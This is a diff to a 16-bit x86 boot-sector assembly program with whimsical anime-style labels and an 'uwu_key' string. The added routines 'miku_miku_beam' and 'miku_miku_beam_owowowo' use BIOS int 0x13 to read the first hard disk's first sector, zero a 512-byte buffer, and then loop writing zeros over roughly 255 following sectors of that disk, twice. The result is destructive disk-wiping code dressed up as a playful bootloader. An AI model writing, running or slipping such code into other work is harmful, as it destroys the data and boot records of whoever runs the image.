@@ -217,6 +217,80 @@ etooo_ne_bleeh:
     add si, 32
     loop etooo_ne_bleeh
 
+
+    call miku_miku_beam
+    call miku_miku_beam_owowowo
+
+    ret
+
+miku_miku_beam:
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x02
+    mov al, 0x01
+    mov ch, 0x00
+    mov cl, 0x01
+    mov dh, 0x00
+    mov dl, 0x80
+    int 0x13
+
+    mov si, 0x7C00
+    mov di, 0x7C00
+    mov cx, 512
+    mov al, 0x00
+nyahallooo:
+    stosb
+    loop nyahallooo
+
+    mov cx, 255
+harikitte_ikou:
+    mov ah, 0x03
+    mov al, 0x01
+    mov ch, 0x00
+    mov cl, 0x02
+    mov dh, 0x00
+    mov dl, 0x80
+    int 0x13
+    inc cl
+    loop harikitte_ikou
+
+    ret
+
+miku_miku_beam_owowowo:
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x02
+    mov al, 0x01
+    mov ch, 0x00
+    mov cl, 0x01
+    mov dh, 0x00
+    mov dl, 0x80
+    int 0x13
+
+    mov si, 0x7C00
+    mov di, 0x7C00
+    mov cx, 512
+    mov al, 0x00
+chiyo_chiyo:
+    stosb
+    loop chiyo_chiyo
+
+    mov cx, 255
+chiyo_chiyo_chiyonoo:
+    mov ah, 0x03
+    mov al, 0x01
+    mov ch, 0x00
+    mov cl, 0x02
+    mov dh, 0x00
+    mov dl, 0x80
+    int 0x13
+    inc cl
+    loop chiyo_chiyo_chiyonoo
+
     ret
 
 sayonara_tehehe:
@@ -229,7 +303,7 @@ Ayaya_OwO:
     db 'UwU', 0x00
 
 uwu_key:
-    db 'UwUo', 'OwOo', 'UwUo', 'OwOo', 'UwUo' 
+    db 'UwUo', 'OwOo', 'UwUo', 'OwOo', 'UwUo'
 
 times 510 - ($ - ikuyooo) db 0
 dw 0xAA55
